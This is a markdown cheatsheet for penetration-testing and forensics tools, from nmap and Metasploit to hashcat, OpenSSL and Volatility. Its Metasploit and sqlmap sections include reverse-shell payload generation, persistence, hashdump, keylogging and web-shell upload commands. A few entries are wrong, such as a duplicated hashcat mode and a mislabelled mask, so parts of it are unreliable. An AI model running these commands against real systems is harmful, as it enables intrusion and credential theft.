# Practical Cybersecurity Cheatsheets

## NMAP Cheatsheet

### Host Discovery
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
nmap -sn -PR 192.168.1.0/24

# No ping (assume hosts up)
nmap -Pn 192.168.1.100

# List scan (DNS resolution only)
nmap -sL 192.168.1.0/24
```

### Port Scanning
```bash
# SYN scan (default, stealth)
nmap -sS 192.168.1.100

# Connect scan
nmap -sT 192.168.1.100

# UDP scan
nmap -sU 192.168.1.100

# All ports
nmap -p- 192.168.1.100

# Top 1000 ports (default)
nmap 192.168.1.100

# Specific ports
nmap -p 22,80,443,8080 192.168.1.100

# Fast scan (top 100)
nmap -F 192.168.1.100
```

### Service/Version Detection
```bash
# Version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive (OS + version + scripts + traceroute)
nmap -A 192.168.1.100

# RPC scan
nmap -sR 192.168.1.100
```

### NSE Scripts
```bash
# All safe scripts
nmap -sC 192.168.1.100

# Specific category
nmap --script vuln 192.168.1.100
nmap --script auth 192.168.1.100
nmap --script exploit 192.168.1.100
nmap --script default,safe 192.168.1.100

# Specific scripts
nmap --script http-title,http-headers,ssl-cert 192.168.1.100

# Vulnerability detection
nmap --script vulners 192.168.1.100
nmap --script smb-vuln-* 192.168.1.100
```

### Output Formats
```bash
# Normal
nmap -oN output.txt 192.168.1.100

# XML
nmap -oX output.xml 192.168.1.100

# Greppable
nmap -oG output.gnmap 192.168.1.100

# All formats
nmap -oA output 192.168.1.100
```

### Timing & Performance
```bash
# Paranoid (slow, IDS evasion)
nmap -T0 192.168.1.100

# Sneaky
nmap -T1 192.168.1.100

# Polite
nmap -T2 192.168.1.100

# Normal (default)
nmap -T3 192.168.1.100

# Aggressive
nmap -T4 192.168.1.100

# Insane (fast, unreliable)
nmap -T5 192.168.1.100
```

### Firewall/IDS Evasion
```bash
# Fragment packets
nmap -f 192.168.1.100

# MTU size
nmap --mtu 24 192.168.1.100

# Decoys
nmap -D RND:10 192.168.1.100

# Source port
nmap --source-port 53 192.168.1.100

# Randomize host order
nmap --randomize-hosts 192.168.1.0/24
```

---

## BURP SUITE Cheatsheet

### Key Shortcuts
| Action | Shortcut |
|--------|----------|
| Send to Repeater | Ctrl+R |
| Send to Intruder | Ctrl+I |
| Send to Scanner | Ctrl+Shift+S |
| Send to Comparer | Ctrl+Alt+C |
| Toggle Intercept | Ctrl+Shift+I |
| Next Request | Ctrl+. |
| Previous Request | Ctrl+, |

### Intruder Attack Types
- **Sniper**: Single payload set, one position at a time
- **Battering Ram**: Single payload set, all positions simultaneously
- **Pitchfork**: Multiple payload sets, one per position
- **Cluster Bomb**: Multiple payload sets, all combinations

### Common Payload Lists
```bash
# Fuzzing
/usr/share/wordlists/seclists/Fuzzing/

# SQLi
/usr/share/wordlists/seclists/Fuzzing/SQLi/

# XSS
/usr/share/wordlists/seclists/Fuzzing/XSS/

# Directory
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

### Extensions
- **Logger++** - Enhanced logging
- **Auto Repeater** - Auto-send to Repeater
- **Auth Matrix** - Authorization testing
- **JSON Beautifier** - Format JSON
- **SAML Raider** - SAML testing
- **JWT Editor** - JWT manipulation

---

## METASPLOIT Cheatsheet

### Basic Commands
```bash
# Start console
msfconsole

# Search modules
search type:exploit platform:windows
search cve:2021-44228
search name:eternalblue

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Show payloads
show payloads

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit
exploit -j  # Run as job

# Sessions
sessions -l
sessions -i 1
sessions -k 1
```

### Meterpreter Commands
```bash
# System info
sysinfo
getuid
getpid

# File system
ls
pwd
cd
download /path/to/file
upload /local/path /remote/path
edit /path/to/file

# Process
ps
migrate <PID>
execute -f cmd.exe -i
shell

# Network
portfwd add -l 3389 -p 3389 -r 192.168.1.100
route add 10.0.0.0/24 1

# Persistence
run persistence -U -i 5 -p 4444 -r 192.168.1.50

# Hashdump
hashdump

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop
```

### Useful Modules
```bash
# Scanning
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/http/http_version

# Brute force
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/http/http_login

# Post-exploitation
use post/windows/gather/enum_applications
use post/windows/gather/enum_logged_on_users
use post/windows/gather/hashdump
use post/windows/manage/enable_rdp
```

### MSFvenom
```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf

# Web shell (PHP)
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh > shell.ps1

# Encode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x64/xor -i 5 -f exe > shell.exe

# List payloads
msfvenom --list payloads
msfvenom --list encoders
msfvenom --list formats
```

---

## SQLMAP Cheatsheet

### Basic Usage
```bash
# Basic GET injection
sqlmap -u "https://example.com/page?id=1" --batch

# POST injection
sqlmap -u "https://example.com/login" --data="user=test&pass=test" --batch

# Cookie injection
sqlmap -u "https://example.com/" --cookie="PHPSESSID=abc123" --batch

# Header injection
sqlmap -u "https://example.com/" -H "User-Agent: test" --batch
```

### Detection & Enumeration
```bash
# Test all parameters
sqlmap -u "https://example.com/page?id=1&cat=2" --batch --crawl=2

# Specific parameter
sqlmap -u "https://example.com/page?id=1" -p id --batch

# Risk/Level
sqlmap -u "https://example.com/page?id=1" --risk=3 --level=5 --batch

# Database info
sqlmap -u "https://example.com/page?id=1" --banner --current-user --current-db --is-dba --batch

# List databases
sqlmap -u "https://example.com/page?id=1" --dbs --batch

# List tables
sqlmap -u "https://example.com/page?id=1" -D dbname --tables --batch

# List columns
sqlmap -u "https://example.com/page?id=1" -D dbname -T users --columns --batch

# Dump data
sqlmap -u "https://example.com/page?id=1" -D dbname -T users --dump --batch
```

### Advanced
```bash
# OS shell
sqlmap -u "https://example.com/page?id=1" --os-shell --batch

# File read
sqlmap -u "https://example.com/page?id=1" --file-read="/etc/passwd" --batch

# File write
sqlmap -u "https://example.com/page?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php" --batch

# Tamper scripts (WAF bypass)
sqlmap -u "https://example.com/page?id=1" --tamper=space2comment,charencode --batch

# Proxy
sqlmap -u "https://example.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# Tor
sqlmap -u "https://example.com/page?id=1" --tor --batch
```

---

## GOBUSTER/FFUF Cheatsheet

### Gobuster
```bash
# Directory enumeration
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u https://example.com -w wordlist.txt -x php,html,txt,js

# DNS subdomain
gobuster dns -d example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHOST
gobuster vhost -u https://example.com -w wordlist.txt

# S3 buckets
gobuster s3 -w wordlist.txt

# Output
gobuster dir -u https://example.com -w wordlist.txt -o results.txt -q
```

### FFUF
```bash
# Directory fuzzing
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# With extensions
ffuf -u https://example.com/FUZZ -w wordlist.txt -e .php,.html,.txt,.js

# Subdomain fuzzing
ffuf -u https://FUZZ.example.com -w subdomains.txt -H "Host: FUZZ.example.com"

# Parameter fuzzing
ffuf -u https://example.com/page?FUZZ=value -w params.txt

# POST fuzzing
ffuf -u https://example.com/login -X POST -d "user=FUZZ&pass=test" -w users.txt

# Recursion
ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Filters
ffuf -u https://example.com/FUZZ -w wordlist.txt -fc 404,403 -fs 0

# Matchers
ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,302

# Rate limiting
ffuf -u https://example.com/FUZZ -w wordlist.txt -rate 50 -t 20

# Output
ffuf -u https://example.com/FUZZ -w wordlist.txt -o results.json -of json
```

---

## HASHCAT Cheatsheet

### Common Hash Modes
| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 3200 | bcrypt |
| 500 | md5crypt |
| 1800 | sha512crypt |
| 7400 | sha256crypt |
| 13100 | Kerberos 5 TGS-REP |
| 13100 | Kerberos 5 AS-REP |
| 1000 | NTLM |
| 1100 | Domain Cached Credentials (DCC) |
| 2100 | Domain Cached Credentials 2 (DCC2) |
| 15300 | OpenSSH Private Key |
| 16600 | PKCS#12 |
| 22000 | WPA/WPA2-PMKID |
| 2500 | WPA/WPA2-EAPOL |

### Attack Modes
```bash
# Dictionary attack (mode 0)
hashcat -m 0 -a 0 hash.txt wordlist.txt

# Straight + rules (mode 0)
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# Combinator (mode 1)
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Brute force (mode 3)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Hybrid dict + mask (mode 6)
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d

# Hybrid mask + dict (mode 7)
hashcat -m 0 -a 7 hash.txt ?d?d?d?d wordlist.txt

# Mask charsets
# ?l = lowercase, ?u = uppercase, ?d = digits, ?s = symbols, ?a = all, ?b = 0x00-0xff
```

### Common Masks
```bash
# 6-8 lowercase
?a?l?l?l?l?l?l

# 8 chars all
?a?a?a?a?a?a?a?a

# 4 digits
?d?d?d?d

# word + 4 digits
?a?a?a?a?d?d?d?d

# 1 upper, 6 lower, 2 digits
?u?l?l?l?l?l?l?d?d
```

### Rules
```bash
# Best64 rule set
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# Toggle case
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/toggle.rule

# Custom rule
echo "u l d" > custom.rule  # Upper, Lower, Digit
hashcat -m 0 -a 0 hash.txt wordlist.txt -r custom.rule
```

### Sessions & Output
```bash
# Save session
hashcat -m 0 -a 0 hash.txt wordlist.txt --session mysession

# Restore session
hashcat --session mysession --restore

# Show cracked
hashcat -m 0 hash.txt --show

# Output format
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt --outfile-format 2
```

---

## GPG Cheatsheet

### Key Management
```bash
# Generate key
gpg --full-generate-key

# List keys
gpg --list-keys
gpg --list-secret-keys

# Export public key
gpg --export -a "user@example.com" > publickey.asc

# Export private key
gpg --export-secret-keys -a "user@example.com" > privatekey.asc

# Import key
gpg --import publickey.asc

# Delete key
gpg --delete-key "user@example.com"
gpg --delete-secret-key "user@example.com"

# Edit key
gpg --edit-key "user@example.com"
# Commands: trust, sign, expire, passwd, addkey, revkey, uid
```

### Encryption/Decryption
```bash
# Encrypt for recipient
gpg --encrypt --recipient "user@example.com" file.txt
gpg -e -r "user@example.com" file.txt

# Encrypt with armor (ASCII)
gpg --encrypt --armor --recipient "user@example.com" file.txt

# Decrypt
gpg --decrypt file.txt.gpg > file.txt
gpg -d file.txt.gpg > file.txt

# Symmetric encryption
gpg --symmetric file.txt
gpg -c file.txt
```

### Signing/Verification
```bash
# Sign file
gpg --sign file.txt
gpg -s file.txt

# Clear sign (readable)
gpg --clearsign file.txt

# Detached signature
gpg --detach-sign file.txt
gpg -b file.txt

# Verify signature
gpg --verify file.txt.sig
gpg --verify file.txt.sig file.txt
```

---

## OPENSSL Cheatsheet

### Hashing
```bash
# SHA256
echo -n "data" | openssl dgst -sha256

# SHA512
echo -n "data" | openssl dgst -sha512

# MD5
echo -n "data" | openssl dgst -md5

# HMAC
echo -n "data" | openssl dgst -sha256 -hmac "secretkey"

# File hash
openssl dgst -sha256 file.txt
```

### Symmetric Encryption
```bash
# Encrypt AES-256-CBC
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass pass:password

# Decrypt
openssl enc -d -aes-256-cbc -in file.enc -out file.txt -pass pass:password

# With base64
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -base64 -pass pass:password
openssl enc -d -aes-256-cbc -in file.enc -out file.txt -base64 -pass pass:password
```

### Asymmetric Keys
```bash
# Generate RSA private key
openssl genrsa -out private.key 4096

# Generate with password
openssl genrsa -aes256 -out private.key 4096

# Extract public key
openssl rsa -in private.key -pubout -out public.key

# View key details
openssl rsa -in private.key -text -noout
openssl rsa -in public.key -pubin -text -noout
```

### Certificates
```bash
# Self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# CSR
openssl req -new -key private.key -out request.csr

# View cert
openssl x509 -in cert.pem -text -noout

# Verify cert
openssl verify cert.pem

# PKCS#12
openssl pkcs12 -export -in cert.pem -inkey private.key -out cert.p12
openssl pkcs12 -in cert.p12 -out cert.pem -nodes
```

### TLS/SSL Testing
```bash
# Connect to server
openssl s_client -connect example.com:443

# Show cert chain
openssl s_client -connect example.com:443 -showcerts

# Check specific protocol
openssl s_client -connect example.com:443 -tls1_2

# Check cipher
openssl s_client -connect example.com:443 -cipher 'ECDHE-RSA-AES256-GCM-SHA384'

# StartTLS
openssl s_client -connect example.com:587 -starttls smtp
openssl s_client -connect example.com:21 -starttls ftp
```

---

## TSHARK Cheatsheet

### Capture
```bash
# Capture to file
tshark -i eth0 -w capture.pcap

# Capture with filter
tshark -i eth0 -f "tcp port 80" -w capture.pcap

# Ring buffer (rotate files)
tshark -i eth0 -b filesize:100000 -b files:10 -w capture.pcap

# Duration limit
tshark -i eth0 -a duration:60 -w capture.pcap
```

### Read/Analyze
```bash
# Read pcap
tshark -r capture.pcap

# Display filter
tshark -r capture.pcap -Y "http.request.method == POST"

# Fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.host -e http.request.uri

# JSON output
tshark -r capture.pcap -T json

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# Statistics
tshark -r capture.pcap -q -z io,phs
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z endpoints,tcp
tshark -r capture.pcap -q -z http,tree
```

### Common Filters
```bash
# HTTP
http
http.request
http.response
http.request.method == "POST"
http.host == "example.com"
http.request.uri contains "admin"

# DNS
dns
dns.qry.name == "example.com"

# TCP
tcp.port == 80
tcp.flags.syn == 1
tcp.flags.reset == 1

# TLS
tls
tls.handshake.type == 1  # Client Hello
ssl.handshake.extensions_server_name == "example.com"

# IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 192.168.1.100
```

---

## VOLATILITY 3 Cheatsheet

### Common Plugins
```bash
# Process list
python3 vol.py -f mem.raw windows.pslist

# Process tree
python3 vol.py -f mem.raw windows.pstree

# Command lines
python3 vol.py -f mem.raw windows.cmdline

# Network connections
python3 vol.py -f mem.raw windows.netscan

# Open files
python3 vol.py -f mem.raw windows.filescan

# Registry
python3 vol.py -f mem.raw windows.registry.hivelist
python3 vol.py -f mem.raw windows.registry.printkey -o "Microsoft\\Windows\\CurrentVersion\\Run"

# DLLs
python3 vol.py -f mem.raw windows.dlllist

# Handles
python3 vol.py -f mem.raw windows.handles

# Malfind (injected code)
python3 vol.py -f mem.raw windows.malfind

# Hollow processes
python3 vol.py -f mem.raw windows.hollowfind

# Services
python3 vol.py -f mem.raw windows.svcscan

# Drivers
python3 vol.py -f mem.raw windows.driverirp

# Timers
python3 vol.py -f mem.raw windows.timers

# Callbacks
python3 vol.py -f mem.raw windows.callbacks

# Memory sections
python3 vol.py -f mem.raw windows.vadinfo

# Dump process
python3 vol.py -f mem.raw windows.memmap --pid 1234 --dump

# Dump DLL
python3 vol.py -f mem.raw windows.dlldump --pid 1234 --dump
```

### Linux/Mac
```bash
# Process list
python3 vol.py -f mem.raw linux.pslist

# Network
python3 vol.py -f mem.raw linux.netstat

# Kernel modules
python3 vol.py -f mem.raw linux.lsmod

# Bash history
python3 vol.py -f mem.raw linux.bash

# Open files
python3 vol.py -f mem.raw linux.lsof
```

---

## QUICK REFERENCE: Common Ports

| Port | Service | Protocol |
|------|---------|----------|
| 21 | FTP | TCP |
| 22 | SSH | TCP |
| 23 | Telnet | TCP |
| 25 | SMTP | TCP |
| 53 | DNS | TCP/UDP |
| 67/68 | DHCP | UDP |
| 69 | TFTP | UDP |
| 80 | HTTP | TCP |
| 110 | POP3 | TCP |
| 135 | RPC | TCP |
| 139 | NetBIOS | TCP |
| 143 | IMAP | TCP |
| 161/162 | SNMP | UDP |
| 389 | LDAP | TCP |
| 443 | HTTPS | TCP |
| 445 | SMB | TCP |
| 465 | SMTPS | TCP |
| 587 | SMTP (submission) | TCP |
| 636 | LDAPS | TCP |
| 993 | IMAPS | TCP |
| 995 | POP3S | TCP |
| 1433 | MSSQL | TCP |
| 1521 | Oracle | TCP |
| 3306 | MySQL | TCP |
| 3389 | RDP | TCP |
| 5432 | PostgreSQL | TCP |
| 5900 | VNC | TCP |
| 6379 | Redis | TCP |
| 8080 | HTTP Proxy | TCP |
| 8443 | HTTPS Alt | TCP |
| 27017 | MongoDB | TCP |

---

## QUICK REFERENCE: File Extensions by Category

### Executables
`.exe`, `.dll`, `.bat`, `.cmd`, `.ps1`, `.vbs`, `.msi`, `.jar`, `.app`, `.bin`, `.elf`, `.so`

### Scripts
`.py`, `.rb`, `.pl`, `.sh`, `.bash`, `.zsh`, `.php`, `.asp`, `.aspx`, `.jsp`, `.js`, `.ts`

### Archives
`.zip`, `.rar`, `.7z`, `.tar`, `.gz`, `.bz2`, `.xz`, `.tgz`, `.tar.gz`, `.tar.bz2`

### Documents
`.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.ppt`, `.pptx`, `.odt`, `.ods`, `.rtf`, `.txt`

### Web
`.html`, `.htm`, `.css`, `.js`, `.json`, `.xml`, `.yaml`, `.yml`, `.svg`

### Config
`.conf`, `.config`, `.ini`, `.cfg`, `.yaml`, `.yml`, `.json`, `.toml`, `.env`

### Database
`.sql`, `.db`, `.sqlite`, `.mdb`, `.accdb`, `.frm`, `.ibd`

### Certificates/Keys
`.pem`, `.crt`, `.cer`, `.der`, `.p12`, `.pfx`, `.key`, `.pem`, `.csr`, `.p7b`

---

## USEFUL ONE-LINERS

### Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Find World-Writable Files
```bash
find / -perm -0002 -type f 2>/dev/null
```

### List Open Ports
```bash
ss -tulpn
netstat -tulpn
```

### Check for Rootkits
```bash
# Check for hidden processes
ps aux | awk '{print $2}' | sort -n | uniq -c | awk '$1>1'

# Check /proc vs ps
ls /proc/ | grep -E '^[0-9]+$' | sort -n | while read pid; do ps -p $pid >/dev/null 2>&1 || echo "Hidden PID: $pid"; done
```

### Base64 Decode File
```bash
base64 -d encoded.txt > decoded.bin
```

### Extract Strings from Binary
```bash
strings -n 8 binary | grep -i "password\|key\|secret\|token"
```

### Quick Web Server
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Node
npx serve .

# PHP
php -S 0.0.0.0:8000
```

### Port Forwarding with SSH
```bash
# Local forward
ssh -L 8080:localhost:80 user@remote

# Remote forward
ssh -R 8080:localhost:80 user@remote

# Dynamic (SOCKS)
ssh -D 1080 user@remote
```

### Generate Random Password
```bash
# OpenSSL
openssl rand -base64 32

# /dev/urandom
tr -dc 'A-Za-z0-9!@#$%^&*()' < /dev/urandom | head -c 32

# pwgen
pwgen -s 32 1
```

### Check Certificate Expiry
```bash
openssl x509 -in cert.pem -noout -dates

# Check remote
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
```